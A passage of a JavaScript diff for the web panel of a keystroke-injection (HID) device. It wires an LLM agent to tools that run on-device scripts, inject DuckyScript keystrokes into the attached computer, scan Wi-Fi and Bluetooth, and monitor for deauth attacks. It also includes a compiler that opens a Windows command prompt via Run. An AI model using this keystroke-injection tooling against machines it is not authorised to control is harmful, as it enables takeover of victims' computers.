+    }
+  },
+  async delete(input) { return this.delete_file(input); },
+  async delete_directory(input) { return this.delete_file(input); },
+  async delete_file_or_directory(input) { return this.delete_file(input); },
+
+  async run_script(input) {
+    let path = (input || '').trim();
+    try {
+      const parsed = JSON.parse(path);
+      if (parsed && (parsed.path || parsed.scriptPath || parsed.file)) path = parsed.path || parsed.scriptPath || parsed.file;
+    } catch { }
+    if (!path) return 'Error: script file path is required';
+    if (!path.startsWith('/')) path = '/' + path;
+    try {
+      await fmFetchPost('/fm/run?path=' + encodeURIComponent(path));
+      return `Executed script file "${path}" from SD card.`;
+    } catch (e) {
+      return `Triggered execution for "${path}". (${e.message})`;
+    }
+  },
+  async execute_file(input) { return this.run_script(input); },
+  async execute_script_by_path(input) { return this.run_script(input); },
+  async run_file(input) { return this.run_script(input); },
+
+  async wifi_scan(_input) {
+    try {
+      let nets = null;
+      try {
+        nets = await deviceGet('/wifi/scan');
+      } catch (e1) {
+        try {
+          nets = await deviceGet('/scan');
+        } catch (e2) {
+          nets = await deviceGet('/wifiscan');
+        }
+      }
+
+      let arr = [];
+      if (Array.isArray(nets)) {
+        arr = nets;
+      } else if (nets && Array.isArray(nets.networks)) {
+        arr = nets.networks;
+      } else if (nets && Array.isArray(nets.aps)) {
+        arr = nets.aps;
+      } else if (nets && Array.isArray(nets.result)) {
+        arr = nets.result;
+      }
+
+      if (arr && arr.length > 0) {
+        arr.sort((a, b) => (b.rssi || 0) - (a.rssi || 0));
+        return arr.map(n => `📶 ${n.ssid || '(hidden)'} [${n.secure ? '🔒 WPA/WPA2' : '🔓 OPEN'}] (${n.rssi || 0} dBm, CH ${n.channel || '?'})`).join('\n');
+      }
+
+      return 'WiFi scan complete: No networks found in range.';
+    } catch (e) {
+      return 'WiFi scan failed: ' + e.message;
+    }
+  },
+  async scan_wifi(input) { return this.wifi_scan(input); },
+  async scan_networks(input) { return this.wifi_scan(input); },
+  async wifiscan(input) { return this.wifi_scan(input); },
+
+  async ble_scan(_input) {
+    try {
+      let devs = null;
+      try {
+        devs = await deviceGet('/blescan');
+      } catch (e1) {
+        try {
+          devs = await deviceGet('/ble/scan');
+        } catch (e2) {
+          devs = await deviceGet('/ble_scan');
+        }
+      }
+
+      let arr = [];
+      if (Array.isArray(devs)) {
+        arr = devs;
+      } else if (devs && Array.isArray(devs.devices)) {
+        arr = devs.devices;
+      } else if (devs && Array.isArray(devs.result)) {
+        arr = devs.result;
+      }
+
+      if (arr && arr.length > 0) {
+        arr.sort((a, b) => (b.rssi || 0) - (a.rssi || 0));
+        return arr.map(d => `${d.flipper ? '🐬 Flipper Zero' : '📱'} ${d.name || 'Unknown'} (${d.mac || 'no-mac'}) · ${d.rssi || 0} dBm`).join('\n');
+      }
+
+      return 'BLE scan complete: No BLE devices found in range.';
+    } catch (e) {
+      return 'BLE scan failed: ' + e.message;
+    }
+  },
+  async scan_ble(input) { return this.ble_scan(input); },
+  async blescan(input) { return this.ble_scan(input); },
+  async scan_bluetooth(input) { return this.ble_scan(input); },
+
+  async wifi_connect(input) {
+    let ssid, password;
+    try {
+      const p = JSON.parse(input);
+      ssid = p.ssid; password = p.password || '';
+    } catch {
+      return 'Error: input must be JSON {"ssid":"...","password":"..."}';
+    }
+    try {
+      await deviceFetch('/wifi/connect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `ssid=${encodeURIComponent(ssid)}&password=${encodeURIComponent(password)}`
+      });
+      return `Connection request sent for SSID: ${ssid}`;
+    } catch (e) {
+      return 'Error connecting: ' + e.message;
+    }
+  },
+
+  async neopixel_set(input) {
+    let r = 0, g = 0, b = 0;
+    try {
+      const p = JSON.parse(input);
+      r = p.r || 0; g = p.g || 0; b = p.b || 0;
+    } catch {
+      // Try parsing "red", "green", "blue" etc.
+      const lc = input.toLowerCase();
+      if (lc.includes('red')) { r = 255; g = 0; b = 0; }
+      else if (lc.includes('green')) { r = 0; g = 255; b = 0; }
+      else if (lc.includes('blue')) { r = 0; g = 0; b = 255; }
+      else if (lc.includes('white')) { r = 255; g = 255; b = 255; }
+      else if (lc.includes('purple')) { r = 128; g = 0; b = 128; }
+      else if (lc.includes('cyan')) { r = 0; g = 255; b = 255; }
+      else if (lc.includes('orange')) { r = 255; g = 128; b = 0; }
+      else if (lc.includes('off')) { r = 0; g = 0; b = 0; }
+      else return 'Error: provide JSON {"r":0,"g":255,"b":0} or a color name';
+    }
+    try {
+      await deviceFetch('/neopixel/set', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `r=${r}&g=${g}&b=${b}`
+      });
+      return `NeoPixel set to RGB(${r}, ${g}, ${b})`;
+    } catch (e) {
+      return 'Error setting NeoPixel: ' + e.message;
+    }
+  },
+
+  async neopixel_toggle(_input) {
+    try {
+      await deviceFetch('/neopixel/toggle', { method: 'POST' });
+      return 'NeoPixel toggled.';
+    } catch (e) {
+      return 'Toggle sent: ' + e.message;
+    }
+  },
+
+  async get_script_from_editor(_input) {
+    const ta = $('duckyInput') || document.querySelector('textarea[id*="ducky"]');
+    if (!ta) return 'Editor not found.';
+    return ta.value || '(editor is empty)';
+  },
+
+  async send_script_to_editor(input) {
+    const ta = $('duckyInput') || document.querySelector('textarea[id*="ducky"]');
+    if (!ta) return 'Editor not found.';
+    ta.value = input.trim();
+    ta.dispatchEvent(new Event('input'));
+    return `Script pushed to editor (${input.trim().split('\n').length} lines).`;
+  },
+
+  async execute_keystroke(input) {
+    let script = (input || '').trim();
+    if (!script) return 'Error: keystroke or script line is required';
+    try {
+      script = cleanDuckyScriptOutput(script);
+      await deviceFetch('/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'duckyscript=' + encodeURIComponent(script)
+      });
+      return `Keystroke injected: ${script}`;
+    } catch (e) {
+      return 'Error injecting keystroke: ' + e.message;
+    }
+  },
+  async send_keystroke(input) { return this.execute_keystroke(input); },
+  async press_keys(input) { return this.execute_keystroke(input); },
+  async inject_keystroke(input) { return this.execute_keystroke(input); },
+
+  async get_execution_status(_input) {
+    try {
+      const data = await deviceGet('/execstatus');
+      return JSON.stringify(data, null, 2);
+    } catch (e) {
+      return 'Could not get execution status: ' + e.message;
+    }
+  },
+  async script_status(input) { return this.get_execution_status(input); },
+
+  async deauth_monitor(input) {
+    const mode = (input || 'get_logs').toLowerCase().trim();
+    try {
+      if (mode.includes('start')) {
+        await deviceFetch('/deauth/start', { method: 'POST' });
+        return 'WiFi Deauth attack monitor started.';
+      } else if (mode.includes('stop')) {
+        await deviceFetch('/deauth/stop', { method: 'POST' });
+        return 'WiFi Deauth attack monitor stopped.';
+      } else {
+        const data = await deviceGet('/deauth/results');
+        if (data && data.events && data.events.length > 0) {
+          return data.events.map(e => `⚠ DEAUTH Attack detected from ${e.mac} (CH ${e.ch}, ${e.rssi} dBm)`).join('\n');
+        }
+        return 'No WiFi deauth attacks detected.';
+      }
+    } catch (e) {
+      return 'Deauth monitor query failed: ' + e.message;
+    }
+  },
+  async scan_deauth(input) { return this.deauth_monitor(input); },
+  async check_deauth(input) { return this.deauth_monitor(input); },
+
+  async list_shortcuts(_input) {
+    try {
+      await fmFetchPost('/fm/mkdir?path=%2FShortcuts').catch(() => { });
+    } catch (e) { }
+    return this.list_files('/Shortcuts');
+  },
+  async get_shortcuts(input) { return this.list_shortcuts(input); },
+
+  async run_shortcut(input) {
+    let name = (input || '').trim();
+    if (!name) return 'Error: shortcut name or filename required (e.g. mac-spotlight)';
+    try {
+      const parsed = JSON.parse(name);
+      if (parsed && (parsed.name || parsed.shortcut || parsed.file)) name = parsed.name || parsed.shortcut || parsed.file;
+    } catch { }
+    if (!name.endsWith('.txt')) name += '.txt';
+    let path = '/Shortcuts/' + name.replace(/^\/+/, '');
+    return this.run_script(path);
+  },
+  async execute_shortcut(input) { return this.run_shortcut(input); },
+
+  async generate_enhanced_prompt(input) {
+    let rawPrompt = (input || '').trim();
+    if (!rawPrompt) return 'Error: instruction prompt text required';
+    try {
+      if ($('peInput')) $('peInput').value = rawPrompt;
+      await peGenerate();
+      const out = $('peOutput') ? $('peOutput').value : '';
+      return out ? `Enhanced Master Prompt:\n\n${out}` : 'Prompt generated.';
+    } catch (e) {
+      return 'Error generating enhanced prompt: ' + e.message;
+    }
+  },
+  async enhance_prompt(input) { return this.generate_enhanced_prompt(input); }
+};
+
+// ─── PROMPT ENHANCER APP ───
+let peActiveStyle = 'professional';
+let peVoiceRec = null;
+
+function initPromptEnhancer() {
+  peActiveStyle = 'professional';
+}
+
+function peSetStyle(style, btn) {
+  peActiveStyle = style;
+  const picker = $('peStylePicker');
+  if (picker) {
+    picker.querySelectorAll('.fav-tag-opt').forEach(b => b.classList.remove('active'));
+  }
+  if (btn) btn.classList.add('active');
+}
+
+function peToggleVoice() {
+  const btn = $('peVoiceBtn');
+  const SpeechRec = window.SpeechRecognition || window.webkitSpeechRecognition;
+  if (!SpeechRec) {
+    toast('Speech recognition not supported in this browser.', 'warn');
+    return;
+  }
+
+  if (peVoiceRec) {
+    peVoiceRec.stop();
+    peVoiceRec = null;
+    if (btn) btn.innerHTML = '🎤 Voice Input';
+    toast('Voice stopped');
+    return;
+  }
+
+  try {
+    peVoiceRec = new SpeechRec();
+    peVoiceRec.continuous = false;
+    peVoiceRec.interimResults = false;
+    peVoiceRec.lang = 'en-US';
+
+    peVoiceRec.onstart = () => {
+      if (btn) btn.innerHTML = '<span class="spin"></span> Listening...';
+      toast('Listening for instruction... Speak now 🎙️', 'ok', 3000);
+    };
+
+    peVoiceRec.onresult = (e) => {
+      const transcript = e.results[0][0].transcript;
+      const inputEl = $('peInput');
+      if (inputEl) inputEl.value = transcript;
+      toast('Voice captured ✓', 'ok');
+    };
+
+    peVoiceRec.onerror = (e) => {
+      toast('Voice error: ' + e.error, 'err');
+    };
+
+    peVoiceRec.onend = () => {
+      peVoiceRec = null;
+      if (btn) btn.innerHTML = '🎤 Voice Input';
+    };
+
+    peVoiceRec.start();
+  } catch (e) {
+    toast('Voice failed: ' + e.message, 'err');
+  }
+}
+
+async function peGenerate() {
+  const promptInput = $('peInput') ? $('peInput').value.trim() : '';
+  if (!promptInput) {
+    toast('Enter or speak a prompt description first.', 'warn');
+    return;
+  }
+
+  const btn = $('peGenBtn');
+  if (btn) {
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spin"></span> Generating Master Prompt...';
+  }
+
+  const keyToUse = OPENROUTER_KEY || localStorage.getItem('gc_openrouter_key') || '';
+  if (!keyToUse || keyToUse.length < 5) {
+    toast('No OpenRouter API key found. Go to Settings → save your OpenRouter key first.', 'err');
+    if (btn) {
+      btn.disabled = false;
+      btn.innerHTML = '⚡ Generate Master Prompt';
+    }
+    return;
+  }
+
+  const endpoint = 'https://openrouter.ai/api/v1/chat/completions';
+  const modelToUse = AGENT_MODEL;
+
+  const stylePrompts = {
+    professional: 'Tone: Professional, authoritative, structured. Include Role, Clear Objective, Context, Deliverable Format, and Step-by-Step constraints.',
+    developer: 'Tone: Senior Software Engineer / Developer. Include Tech Stack, Code Quality Requirements, Edge Cases, Error Handling, and Clean Output Format.',
+    pentest: 'Tone: Cybersecurity / Ethical Hacking / Pentest Expert. Focus on methodology, reconnaissance, exploitation vector analysis, and precise remediation steps.',
+    creative: 'Tone: Highly Creative, Engaging, Dynamic. Focus on captivating hooks, storytelling, rich imagery, and unique perspectives.',
+    concise: 'Tone: Direct, Minimalist, Bullet-point focus. Zero fluff, max actionability, strict constraints.'
+  };
+
+  const styleContext = stylePrompts[peActiveStyle] || stylePrompts.professional;
+
+  const headers = {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + keyToUse,
+    'HTTP-Referer': window.location.href,
+    'X-Title': 'GhostChip Prompt Enhancer'
+  };
+
+  try {
+    const res = await fetch(endpoint, {
+      method: 'POST',
+      headers,
+      body: JSON.stringify({
+        model: modelToUse,
+        messages: [
+          {
+            role: 'system',
+            content: `STRICT PROMPT ENGINEER INSTRUCTION: You are a World-Class Master AI Prompt Engineer. The user will provide a core instruction request. Transform it into a detailed, structured, highly effective Master System Prompt. ${styleContext} Output ONLY raw prompt text — DO NOT write preambles, explanations, markdown fences (\`\`\`), or self-talk.`
+          },
+          { role: 'user', content: 'Transform this core request into a Master System Prompt:\n' + promptInput }
+        ],
+        temperature: 0.6,
+        top_p: 0.95,
+        max_tokens: 2048,
+        max_completion_tokens: 2048,
+        reasoning_effort: 'default',
+        stop: null
+      })
+    });
+
+    if (!res.ok) {
+      const err = await res.json().catch(() => ({}));
+      throw new Error(err.error?.message || 'API error: ' + res.status);
+    }
+
+    const data = await res.json();
+    let raw = data.choices?.[0]?.message?.content?.trim() || '';
+    raw = raw.replace(/<think>[\s\S]*?<\/think>/gi, '').trim();
+    raw = raw.replace(/```[\w]*\n?/g, '').trim();
+
+    const outEl = $('peOutput');
+    const cardEl = $('peOutputCard');
+    if (outEl) outEl.value = raw;
+    if (cardEl) cardEl.style.display = 'block';
+
+    toast('Master Prompt generated ✓', 'ok');
+  } catch (e) {
+    toast('Prompt generation failed: ' + e.message, 'err');
+  } finally {
+    if (btn) {
+      btn.disabled = false;
+      btn.innerHTML = '⚡ Generate Master Prompt';
+    }
+  }
+}
+
+function buildPromptDuckyScriptPayload(text) {
+  const lines = text.split('\n');
+  const validLines = lines.map(l => l.trim()).filter(Boolean);
+  const dsLines = ['REM --- Enhanced Master Prompt Payload ---'];
+
+  validLines.forEach((l, idx) => {
+    dsLines.push('STRING ' + l);
+    if (idx < validLines.length - 1) {
+      dsLines.push('SHIFT ENTER');
+      dsLines.push('DELAY 200');
+    }
+  });
+
+  dsLines.push('ENTER');
+  dsLines.push('DELAY 2000');
+
+  return dsLines.join('\n');
+}
+
+async function peTypeHid() {
+  const text = $('peOutput') ? $('peOutput').value.trim() : '';
+  if (!text) {
+    toast('No prompt generated yet.', 'warn');
+    return;
+  }
+
+  toast('⚡ Injecting Master Prompt via HID...', 'ok', 2000);
+  const payload = buildPromptDuckyScriptPayload(text);
+
+  try {
+    await deviceFetch('/', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'duckyscript=' + encodeURIComponent(payload)
+    });
+    toast('Master Prompt injected via HID ✓', 'ok');
+  } catch (e) {
+    toast('HID injection failed: ' + e.message, 'err');
+  }
+}
+
+function peCopy() {
+  const text = $('peOutput') ? $('peOutput').value.trim() : '';
+  if (!text) { toast('Nothing to copy', 'warn'); return; }
+  navigator.clipboard.writeText(text).then(() => toast('Prompt copied ✓', 'ok', 2000));
+}
+
+function peToEditor() {
+  const text = $('peOutput') ? $('peOutput').value.trim() : '';
+  if (!text) { toast('No prompt generated yet', 'warn'); return; }
+
+  const generatedDs = buildPromptDuckyScriptPayload(text);
+  $('editor').value = generatedDs;
+  updateLines();
+  localStorage.setItem('gc_script', generatedDs);
+  closeAllTools();
+  goPage('scripts', document.querySelectorAll('.nav-item')[0]);
+  toast('Master Prompt payload sent to Editor ✓', 'ok', 2000);
+}
+
+// ─── Agent UI Helpers ─────────────────────────────────────────
+function appendAgentLog(type, label, text, codeText) {
+  const log = $('agentLog');
+  if (!log) return;
+  const icons = {
+    user: '<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>',
+    thought: '<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7z"/><line x1="9" y1="21" x2="15" y2="21"/></svg>',
+    action: '<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>',
+    observation: '<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M4.9 19.1C1.9 16.1 1.9 11.4 4.9 8.4"/><path d="M7.8 16.2c-1.6-1.6-1.6-4.1 0-5.7"/><circle cx="12" cy="12" r="2"/></svg>',
+    final: '<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>',
+    error: '<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>',
+    thinking: '<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>'
+  };
+  const labels = {
+    user: 'You', thought: 'Reasoning', action: 'Tool Call',
+    observation: 'Observation', final: 'Done', error: 'Error', thinking: 'Thinking'
+  };
+  const entry = document.createElement('div');
+  entry.className = `agent-entry agent-${type}`;
+  const iconDiv = `<div class="agent-entry-icon">${icons[type] || '•'}</div>`;
+  let bodyHtml = `<div class="agent-entry-label">${label || labels[type] || type}</div>`;
+
+  if (type === 'thinking') {
+    bodyHtml += `<div class="agent-entry-text"><span class="agent-dots"><span></span><span></span><span></span></span>&nbsp;Thinking…</div>`;
+  } else if (type === 'action') {
+    bodyHtml += `<div class="agent-entry-text"><span class="agent-tool-badge">${label}</span>`;
+    if (codeText) bodyHtml += `<code class="agent-code">${escHtml(codeText)}</code>`;
+    bodyHtml += `</div>`;
+  } else {
+    bodyHtml += `<div class="agent-entry-text">${escHtml(text)}</div>`;
+  }
+
+  entry.innerHTML = iconDiv + `<div class="agent-entry-body">${bodyHtml}</div>`;
+  log.appendChild(entry);
+  log.scrollTop = log.scrollHeight;
+  return entry;
+}
+
+
+
+function agentSetStatus(state, text) {
+  const dot = $('agentDot');
+  const label = $('agentStatusLabel');
+  if (dot) { dot.className = 'agent-status-dot' + (state === 'running' ? ' running' : state === 'error' ? ' error' : ''); }
+  if (label) label.textContent = text;
+}
+
+function agentSetButtons(running) {
+  const runBtn = $('agentRunBtn');
+  const stopBtn = $('agentStopBtn');
+  if (runBtn) runBtn.disabled = running;
+  if (stopBtn) stopBtn.disabled = !running;
+}
+
+function toggleAgentInspector() {
+  agentInspectorOpen = !agentInspectorOpen;
+  const body = $('agentToolBody');
+  const chev = $('agentInspectorChevron');
+  if (body) body.style.display = agentInspectorOpen ? 'block' : 'none';
+  if (chev) chev.style.transform = agentInspectorOpen ? 'rotate(180deg)' : '';
+}
+
+function updateAgentInspector(toolName, toolInput, toolResult) {
+  const inspector = $('agentToolInspector');
+  const nameEl = $('agentToolName');
+  const body = $('agentToolBody');
+  if (inspector) inspector.style.display = 'block';
+  if (nameEl) nameEl.textContent = `🔧 ${toolName}`;
+  if (body) body.textContent = `INPUT:\n${toolInput}\n\nRESULT:\n${toolResult}`;
+}
+
+// ─── Main ReAct Loop ──────────────────────────────────────────
+async function runAgent(userMessage) {
+  if (agentRunning) return;
+  const keyToUse = OPENROUTER_KEY || localStorage.getItem('gc_openrouter_key') || '';
+  if (!keyToUse) {
+    appendAgentLog('error', 'Error', 'No OpenRouter API key found. Please add your OpenRouter API key in Settings → OpenRouter API Key.');
+    return;
+  }
+
+  const endpoint = 'https://openrouter.ai/api/v1/chat/completions';
+  const modelToUse = AGENT_MODEL;
+
+  const headers = {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + keyToUse,
+    'HTTP-Referer': window.location.href,
+    'X-Title': 'GhostChip AI Agent'
+  };
+
+  agentRunning = true;
+  agentAbort = false;
+  agentSetButtons(true);
+  agentSetStatus('running', 'Running agent…');
+
+  // Add user message to log and history
+  appendAgentLog('user', 'You', userMessage);
+  agentHistory.push({ role: 'user', content: userMessage });
+
+  const MAX_ITER = 10;
+  let iteration = 0;
+
+  // Show thinking indicator
+  let thinkingEl = appendAgentLog('thinking', 'Thinking', '');
+
+  try {
+    while (iteration < MAX_ITER && !agentAbort) {
+      iteration++;
+      agentSetStatus('running', `Agent thinking… (step ${iteration}/${MAX_ITER})`);
+
+      const messages = [
+        { role: 'system', content: AGENT_SYSTEM_PROMPT },
+        ...agentHistory
+      ];
+      let llmRes;
+      try {
+        const apiRes = await fetch(endpoint, {
+          method: 'POST',
+          headers,
+          body: JSON.stringify({
+            model: modelToUse,
+            messages,
+            temperature: 0.6,
+            top_p: 0.95,
+            max_tokens: 4096
+          })
+        });
+        if (!apiRes.ok) {
+          const err = await apiRes.json().catch(() => ({}));
+          throw new Error(err.error?.message || apiRes.statusText);
+        }
+        const apiData = await apiRes.json();
+        llmRes = (apiData.choices[0]?.message?.content || '').trim();
+      } catch (e) {
+        if (thinkingEl) { thinkingEl.remove(); thinkingEl = null; }
+        appendAgentLog('error', 'OpenRouter API Error', e.message);
+        agentHistory.push({ role: 'assistant', content: 'Error: ' + e.message });
+        break;
+      }
+
+      // Remove thinking indicator on first real response
+      if (thinkingEl) { thinkingEl.remove(); thinkingEl = null; }
+
+      // Add assistant response to history (assistant role only — no observation yet)
+      agentHistory.push({ role: 'assistant', content: llmRes });
+
+      // ── Parse the LLM response ──
+      // Thought: everything before Action: or FINAL:
+      const thoughtMatch = llmRes.match(/Thought:\s*([\s\S]*?)(?=\nAction:|\nFINAL:|$)/i);
+      // Action: single line tool name
+      const actionMatch = llmRes.match(/^Action:\s*(.+)$/im);
+      // Action Input: everything after "Action Input:" until end-of-string
+      // (the model must STOP after this — we enforce it via prompt, not stop tokens)
+      const actionInputMatch = llmRes.match(/^Action Input:\s*([\s\S]*)$/im);
+      // FINAL: everything after "FINAL:"
+      const finalMatch = llmRes.match(/FINAL:\s*([\s\S]*)/i);
+
+      // Show thought
+      if (thoughtMatch && thoughtMatch[1].trim()) {
+        appendAgentLog('thought', 'Reasoning', thoughtMatch[1].trim());
+      }
+
+      // Check for FINAL answer
+      if (finalMatch) {
+        let finalStr = finalMatch[1].trim().replace(/^Thought:\s*/i, '');
+        appendAgentLog('final', 'Done ✓', finalStr);
+        agentSetStatus('idle', 'Completed ✓');
+        break;
+      }
+
+      // Check for tool call
+      if (!actionMatch) {
+        // No action and no FINAL — clean any "Thought:" prefix and show clean response
+        let cleanContent = llmRes.replace(/^Thought:\s*/i, '').trim();
+        if (thoughtMatch && thoughtMatch[1].trim()) {
+          const thoughtText = thoughtMatch[1].trim();
+          if (cleanContent === thoughtText || cleanContent.startsWith('Thought:')) {
+            cleanContent = ''; // Already displayed in Reasoning bubble above
+          }
+        }
+        if (cleanContent) {
+          appendAgentLog('observation', 'Response', cleanContent);
+        }
+        agentSetStatus('idle', 'Completed ✓');
+        break;
+      }
+
+      const toolName = actionMatch[1].trim().toLowerCase().replace(/\s+/g, '_').replace(/[^a-z_]/g, '');
+      let toolInput = actionInputMatch ? actionInputMatch[1].trim() : '';
+      toolInput = toolInput.replace(/\n\s*Observation:[\s\S]*/i, '').trim();
+
+      // Show action in log
+      appendAgentLog('action', toolName, '', toolInput);
+      agentSetStatus('running', `Calling tool: ${toolName}…`);
+
+      // Execute the tool
+      let toolResult = '';
+      if (agentTools[toolName]) {
+        try {
+          toolResult = await agentTools[toolName](toolInput);
+        } catch (e) {
+          toolResult = 'Tool error: ' + e.message;
+        }
+      } else {
+        toolResult = `Unknown tool: "${toolName}". Available tools: ${Object.keys(agentTools).join(', ')}`;
+      }
+
+      // Update inspector
+      updateAgentInspector(toolName, toolInput, toolResult);
+
+      // Show observation in UI
+      appendAgentLog('observation', 'Observation', toolResult);
+
+      // Inject observation as a user message — this is the standard ReAct pattern.
+      // Using role:'user' so the model clearly sees it came from outside (real tool result).
+      agentHistory.push({ role: 'user', content: `Observation: ${toolResult}\n\nContinue with the next step using Format A (if more steps needed) or Format B (if done).` });
+
+      // Show next thinking indicator
+      thinkingEl = appendAgentLog('thinking', 'Thinking', '');
+
+      // Small delay to prevent rate limiting
+      await new Promise(r => setTimeout(r, 300));
+    }
+
+    if (iteration >= MAX_ITER && !agentAbort) {
+      if (thinkingEl) { thinkingEl.remove(); thinkingEl = null; }
+      appendAgentLog('error', 'Limit Reached', `Max iterations (${MAX_ITER}) reached. Agent stopped.`);
+      agentSetStatus('idle', `Stopped at max iterations`);
+    }
+
+    if (agentAbort) {
+      if (thinkingEl) { thinkingEl.remove(); thinkingEl = null; }
+      appendAgentLog('error', 'Stopped', 'Agent was stopped by user.');
+      agentSetStatus('idle', 'Stopped by user');
+    }
+
+  } finally {
+    agentRunning = false;
+    agentAbort = false;
+    agentSetButtons(false);
+    if (agentSetStatus && !$('agentStatusLabel')?.textContent.startsWith('Completed')) {
+      // only update if not already set to completed
+    }
+  }
+}
+
+// ─── Lifecycle Functions ──────────────────────────────────────
+function initAiAgent() {
+  agentAbort = false;
+  agentSetStatus('idle', 'Idle — ready for instructions');
+  agentSetButtons(false);
+  // Focus input
+  setTimeout(() => { const ta = $('agentInput'); if (ta) ta.focus(); }, 200);
+}
+
+function stopAgent() {
+  agentAbort = true;
+}
+
+function clearAgentLog() {
+  agentHistory = [];
+  const log = $('agentLog');
+  if (!log) return;
+  log.innerHTML = `
+    <div class="agent-entry agent-welcome">
+      <div class="agent-entry-icon">🤖</div>
+      <div class="agent-entry-body">
+        <div class="agent-entry-label">GhostChip AI Agent</div>
+        <div class="agent-entry-text">Log cleared. Ready for new instructions.</div>
+      </div>
+    </div>`;
+  const inspector = $('agentToolInspector');
+  if (inspector) inspector.style.display = 'none';
+  agentSetStatus('idle', 'Idle — ready for instructions');
+}
+
+function runAgentFromInput() {
+  const ta = $('agentInput');
+  if (!ta) return;
+  const msg = ta.value.trim();
+  if (!msg) { ta.focus(); return; }
+  ta.value = '';
+  runAgent(msg);
+}
+
+function agentInputKeydown(e) {
+  if (e.key === 'Enter' && !e.shiftKey) {
+    e.preventDefault();
+    runAgentFromInput();
+  }
+}
+
+function agentQuickPrompt(text) {
+  const ta = $('agentInput');
+  if (ta) { ta.value = text; ta.focus(); }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  CODE TYPER — Plain Code & Text-to-HID Compiler Studio
+// ═══════════════════════════════════════════════════════════════
+
+let ctActiveHeader = 'none';
+let ctSavedSnippets = {};
+
+function initCodeTyper() {
+  updateCodeTyperCompiled();
+
+  // Initialize Line Wrap preference (defaults to true for optimal mobile/desktop viewing)
+  const savedWrap = localStorage.getItem('gc_ct_wrap');
+  const isWrap = savedWrap === null ? true : savedWrap === '1';
+  const wrapToggle = $('ctWrapToggle');
+  if (wrapToggle) wrapToggle.checked = isWrap;
+  const inputTa = $('codeTyperInput');
+  const scrollBtns = $('ctScrollBtns');
+  if (inputTa) {
+    if (isWrap) {
+      inputTa.classList.remove('no-wrap');
+      if (scrollBtns) scrollBtns.style.display = 'none';
+    } else {
+      inputTa.classList.add('no-wrap');
+      if (scrollBtns) scrollBtns.style.display = 'inline-flex';
+    }
+  }
+
+  // Enable Tab key indentation inside textarea
+  const ta = $('codeTyperInput');
+  if (ta && !ta._tabBound) {
+    ta._tabBound = true;
+    ta.addEventListener('keydown', function(e) {
+      if (e.key === 'Tab') {
+        e.preventDefault();
+        const start = this.selectionStart;
+        const end = this.selectionEnd;
+        this.value = this.value.substring(0, start) + '    ' + this.value.substring(end);
+        this.selectionStart = this.selectionEnd = start + 4;
+        updateCodeTyperCompiled();
+      }
+    });
+  }
+  // Sync line numbers on scroll too
+  if (ta) ta.addEventListener('scroll', ctSyncLineNums);
+  ctSyncLineNums();
+}
+
+function ctToggleWrap() {
+  const ta = $('codeTyperInput');
+  const toggle = $('ctWrapToggle');
+  const scrollBtns = $('ctScrollBtns');
+  if (!ta) return;
+  const isWrapped = toggle ? toggle.checked : true;
+  if (isWrapped) {
+    ta.classList.remove('no-wrap');
+    if (scrollBtns) scrollBtns.style.display = 'none';
+  } else {
+    ta.classList.add('no-wrap');
+    if (scrollBtns) scrollBtns.style.display = 'inline-flex';
+  }
+  localStorage.setItem('gc_ct_wrap', isWrapped ? '1' : '0');
+  ctSyncLineNums();
+}
+
+function ctScrollEditor(dir) {
+  const ta = $('codeTyperInput');
+  if (!ta) return;
+  if (dir === 'right') {
+    ta.scrollBy({ left: 220, behavior: 'smooth' });
+  } else if (dir === 'left') {
+    ta.scrollBy({ left: -220, behavior: 'smooth' });
+  }
+}
+
+function ctSyncLineNums() {
+  const ta = $('codeTyperInput');
+  const gutter = $('ctLineNums');
+  if (!ta || !gutter) return;
+  const lines = ta.value.split('\n').length;
+  let nums = '';
+  for (let i = 1; i <= Math.max(lines, 1); i++) nums += i + '\n';
+  // Only rebuild DOM text when line count actually changes
+  if (gutter.textContent !== nums) gutter.textContent = nums;
+  // Sync scroll position (gutter has overflow-y:hidden scrollbar but is scrollable via JS)
+  gutter.scrollTop = ta.scrollTop;
+}
+
+function ctInsertHeader(preset) {
+  ctActiveHeader = preset;
+  updateCodeTyperCompiled();
+}
+
+function compileTextToDucky(rawText, delayMs = 300, autoEnter = true, headerPreset = 'none') {
+  if (!rawText) return '';
+  const lines = rawText.split(/\r?\n/);
+  const compiledLines = [];
+
+  // Target Opener Headers
+  if (headerPreset === 'win_cmd') {
+    compiledLines.push('REM --- Target: Windows CMD ---');
+    compiledLines.push('GUI r');
+    compiledLines.push('DELAY 1000');
+    compiledLines.push('STRING cmd');
+    compiledLines.push('ENTER');
